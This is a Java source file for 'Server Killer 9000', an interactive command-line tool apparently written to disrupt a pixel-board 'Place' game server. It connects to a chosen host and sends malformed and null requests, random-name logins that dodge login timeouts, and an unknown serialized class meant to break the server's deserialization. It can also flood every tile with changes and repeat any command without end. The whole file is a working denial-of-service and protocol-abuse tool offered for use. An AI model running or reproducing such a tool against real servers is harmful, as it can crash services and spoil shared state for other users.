package killer;
import java.io.*;
import java.util.*;
import place.*;
import place.network.*;
public class ServerKiller{
    private SKB skb;
    private int rlength = 16;
    public ServerKiller(SKB skb){
        this.skb = skb;
        skb.connect();
        skb.InitOutbound();
        skb.InitInbound();
        System.out.println("Activating listening");
        new Thread(skb).start();
        System.out.println("Activating Shell. Have Fun!");
        run();
    }
    private void run(){
        while(true){
            System.out.print("> ");
            process(new java.util.Scanner(System.in).nextLine());
        }
    }

    private void process(String in){
        String[] cmds = in.split(";");
        if(cmds.length>1){
            for(String cmd : cmds){
                process(cmd);
            }
            return;
        }
        String[] splits = in.split(" ");
        switch(splits[0]){
            case "help":
                printHelpMenu();
                break;
            case "login":
                login(splits[1]);
                break;
            case "reconnect":
                skb.reconnect();
                break;
            case "packet":
                packet(splits[1], splits[2]);
                break;
            case "class":
                skb.write2(new SKB("127.0.0.1",5));
                break;
            case "c2":
                packet("CHANGE_TILE", "tile");
                break;
            case "repeat":
                int iterations = 1;
                int max_iterations = Integer.parseInt(splits[1]);
                String cmd = "";
                for(int i=2; i<splits.length; i++)
                    cmd+=splits[i]+" ";
                System.out.println("Executing \'"+cmd+"\' repeatedly.");
                while(iterations!=max_iterations){
                    process(cmd);
                    iterations += 1;
                }
                break;
            case "setr":
                rlength = Integer.parseInt(splits[1]);
                System.out.println("Random login name length set to "+splits[1]);
                break;
            case "q":
                login("ServerKiller");
                break;
            case "flood":
                flood(Integer.parseInt(splits[1]));
                break;
            case "close":
                skb.close();
                break;
        }
    }

    /*
        Request Types:
        LOGIN	           String
        LOGIN_SUCCESSFUL   String
        ERROR	           String
        BOARD	           Board
        CHANGE_TILE	       Tile
        TILE_CHANGED	   Tile
    */

    private void printHelpMenu(){
        System.out.println();
        System.out.println("~~~~~~~~ Help ~~~~~~~~");
        System.out.println("Seperate commands with a \';\' to execute them immediately following each other, i.e. login random;close");
        System.out.println("help - print this");
        System.out.println("q - quick login, used for the 0xcaff server that disconnects if you dont login within 1 second. equals login random");
        System.out.println("reconnect - Reconnect to a sever after it kicks you");
        System.out.println("login <name | random> - Send a login request.");
        System.out.println("packet <LOGIN | LOGIN_SUCCESS | ERROR | BOARD | CHANGE_TILE | TILE_CHANGED | null> <string | board | tile | null>");
        System.out.println("^^ Send a custom request of request type, data type, ");
        System.out.println("ct - short for packet CHANGE_TILE tile");
        System.out.println("class - Sends a class the server doesn't know about (namely, the serverKiller backend.)");
        System.out.println("setr <int> - Set the length of the random strings used with login random");
        System.out.println("close - closes our socket");
        System.out.println("flood <int> - create a CHANGE_TILE request, send to every pixel.");
        System.out.println("repeat <int> <command> - Do one of the above commands, int number of times. Use -1 for infinite.");
        System.out.println();
    }

    private void packet(String rt, String dt){
        PlaceRequest.RequestType t = null;
        switch(rt){
            case "LOGIN":
                t = PlaceRequest.RequestType.LOGIN;
                break;
            case "LOGIN_SUCCESS":
                t = PlaceRequest.RequestType.LOGIN_SUCCESS;
                break;
            case "ERROR":
                t = PlaceRequest.RequestType.ERROR;
                break;
            case "BOARD":
                t = PlaceRequest.RequestType.BOARD;
                break;
            case "CHANGE_TILE":
                t = PlaceRequest.RequestType.CHANGE_TILE;
                break;
            case "TILE_CHANGED":
                t = PlaceRequest.RequestType.TILE_CHANGED;
                break;
        }
        switch(dt){
            case "string":
                System.out.print("String to send: ");
                skb.write(new PlaceRequest<String>(t,new java.util.Scanner(System.in).nextLine()));
                break;
            case "board":
                System.out.println("Sending empty board");
                skb.write(new PlaceRequest<PlaceBoard>(t,new PlaceBoard(0)));
                break;
            case "tile"://y x username color time
                System.out.println("<y> <x> <username> <color 0->F, X for null> <long time, X for now>");
                System.out.print(": ");
                String in = new java.util.Scanner(System.in).nextLine();
                String[] ins = in.split(" ");
                int y = Integer.parseInt(ins[0]);
                int x = Integer.parseInt(ins[1]);
                String usernamey = ins[2];
                if(ins[2].equals("random")){
                    usernamey = getSaltString(rlength);
                }
                PlaceColor color = null;
                for(PlaceColor c2 : PlaceColor.values()){
                    if(c2.toString().equals(ins[3])){
                        color = c2;
                    }
                }
                long time = ins[4].equals("X")?System.currentTimeMillis():Long.parseLong(ins[4]);
                skb.write(new PlaceRequest<PlaceTile>(t,new PlaceTile(y,x,usernamey,color,time)));
                break;
            default:
                skb.write(
                    new PlaceRequest(
                        t,
                        null
                    )
                );
                break;
        }
        System.out.println("Packet Sent!");
    }

    private void flood(int dim){
        System.out.println("<y> <x> <username> <color 0->F, X for null> <long time, X for now>");
        System.out.print(": ");
        String in = new java.util.Scanner(System.in).nextLine();
        String[] ins = in.split(" ");
        int y = Integer.parseInt(ins[0]);
        int x = Integer.parseInt(ins[1]);
        String usernamey = ins[2];
        if(ins[2].equals("random")){
            usernamey = getSaltString(rlength);
        }
        PlaceColor color = null;
        for(PlaceColor c2 : PlaceColor.values()){
            if(c2.toString().equals(ins[3])){
                color = c2;
            }
        }
        long time = ins[4].equals("X")?System.currentTimeMillis():Long.parseLong(ins[4]);
        for(x=0; x<dim; x++){
            for(y=0; y<dim; y++){
                if(ins[2].equals("random")){
                    usernamey = getSaltString(rlength);
                }
                skb.write(new PlaceRequest<PlaceTile>(PlaceRequest.RequestType.CHANGE_TILE,new PlaceTile(y,x,usernamey,color,time)));
                try{
                    Thread.sleep(2001);
                }catch(Exception e){
                    System.out.println("Exception in thread sleep");
                }

            }
        }
    }

    private void login(String name){
        if(name.equals("random")){
            name = getSaltString(rlength);
        }
        System.out.println("Sending login with name \'"+name+"\'");
        skb.write(
            new PlaceRequest<String>(
                PlaceRequest.RequestType.LOGIN,
                name
            )
        );
    }

    protected String getSaltString(int length) {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < length) { // length of the random string.
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;

    }




    public static void main(String[] args){
        for(int i=0; i<=100; i++){
            System.out.println();
        }
        System.out.println("          SSSSSSSSSSSSSSS                                                                                                    ");
        System.out.println("        SS:::::::::::::::S                                                                                                   ");
        System.out.println("        S:::::SSSSSS::::::S                                                                                                   ");
        System.out.println("        S:::::S     SSSSSSS                                                                                                   ");
        System.out.println("        S:::::S                eeeeeeeeeeee    rrrrr   rrrrrrrrrvvvvvvv           vvvvvvv eeeeeeeeeeee    rrrrr   rrrrrrrrr   ");
        System.out.println("        S:::::S              ee::::::::::::ee  r::::rrr:::::::::rv:::::v         v:::::vee::::::::::::ee  r::::rrr:::::::::r  ");
        System.out.println("        S::::SSSS          e::::::eeeee:::::eer:::::::::::::::::rv:::::v       v:::::ve::::::eeeee:::::eer:::::::::::::::::r ");
        System.out.println("        SS::::::SSSSS    e::::::e     e:::::err::::::rrrrr::::::rv:::::v     v:::::ve::::::e     e:::::err::::::rrrrr::::::r");
        System.out.println("         SSS::::::::SS  e:::::::eeeee::::::e r:::::r     r:::::r v:::::v   v:::::v e:::::::eeeee::::::e r:::::r     r:::::r");
        System.out.println("            SSSSSS::::S e:::::::::::::::::e  r:::::r     rrrrrrr  v:::::v v:::::v  e:::::::::::::::::e  r:::::r     rrrrrrr");
        System.out.println("                 S:::::Se::::::eeeeeeeeeee   r:::::r               v:::::v:::::v   e::::::eeeeeeeeeee   r:::::r            ");
        System.out.println("                 S:::::Se:::::::e            r:::::r                v:::::::::v    e:::::::e            r:::::r            ");
        System.out.println("        SSSSSSS     S:::::Se::::::::e           r:::::r                 v:::::::v     e::::::::e           r:::::r            ");
        System.out.println("        S::::::SSSSSS:::::S e::::::::eeeeeeee   r:::::r                  v:::::v       e::::::::eeeeeeee   r:::::r            ");
        System.out.println("        S:::::::::::::::SS   ee:::::::::::::e   r:::::r                   v:::v         ee:::::::::::::e   r:::::r            ");
        System.out.println("        SSSSSSSSSSSSSSS       eeeeeeeeeeeeee   rrrrrrr                    vvv            eeeeeeeeeeeeee   rrrrrrr            ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("                                                                                                                           ");
        System.out.println("        KKKKKKKKK    KKKKKKK  iiii  lllllll lllllll                                                                           ");
        System.out.println("        K:::::::K    K:::::K i::::i l:::::l l:::::l                                                                           ");
        System.out.println("        K:::::::K    K:::::K  iiii  l:::::l l:::::l                                                                           ");
        System.out.println("        K:::::::K   K::::::K        l:::::l l:::::l                                                                           ");
        System.out.println("        KK::::::K  K:::::KKKiiiiiii  l::::l  l::::l     eeeeeeeeeeee    rrrrr   rrrrrrrrr                                     ");
        System.out.println("        K:::::K K:::::K   i:::::i  l::::l  l::::l   ee::::::::::::ee  r::::rrr:::::::::r                                    ");
        System.out.println("        K::::::K:::::K     i::::i  l::::l  l::::l  e::::::eeeee:::::eer:::::::::::::::::r                                   ");
        System.out.println("        K:::::::::::K      i::::i  l::::l  l::::l e::::::e     e:::::err::::::rrrrr::::::r                                  ");
        System.out.println("        K:::::::::::K      i::::i  l::::l  l::::l e:::::::eeeee::::::e r:::::r     r:::::r                                  ");
        System.out.println("        K::::::K:::::K     i::::i  l::::l  l::::l e:::::::::::::::::e  r:::::r     rrrrrrr                                  ");
        System.out.println("        K:::::K K:::::K    i::::i  l::::l  l::::l e::::::eeeeeeeeeee   r:::::r                                              ");
        System.out.println("        KK::::::K  K:::::KKK i::::i  l::::l  l::::l e:::::::e            r:::::r                                              ");
        System.out.println("        K:::::::K   K::::::Ki::::::il::::::ll::::::le::::::::e           r:::::r                                              ");
        System.out.println("        K:::::::K    K:::::Ki::::::il::::::ll::::::l e::::::::eeeeeeee   r:::::r                                              ");
        System.out.println("        K:::::::K    K:::::Ki::::::il::::::ll::::::l  ee:::::::::::::e   r:::::r                                              ");
        System.out.println("        KKKKKKKKK    KKKKKKKiiiiiiiillllllllllllllll    eeeeeeeeeeeeee   rrrrrrr    ");
        System.out.println();
        System.out.println();
        System.out.println();
        System.out.println("Welcome to the Server Killer 9000!");
        System.out.println("User input not validated, so be careful.");
        System.out.print("Enter Hostname to Connect To: ");
        String host = new java.util.Scanner(System.in).nextLine();
        System.out.print("Enter port to connect to: ");
        int port = Integer.parseInt(new java.util.Scanner(System.in).nextLine());
        System.out.print("Instantiating Backend Network handler... ");
        SKB skb = new SKB(host, port);
        System.out.println("Done!");
        System.out.println("Activating interface, Good luck!");
        new ServerKiller(skb);
    }
}
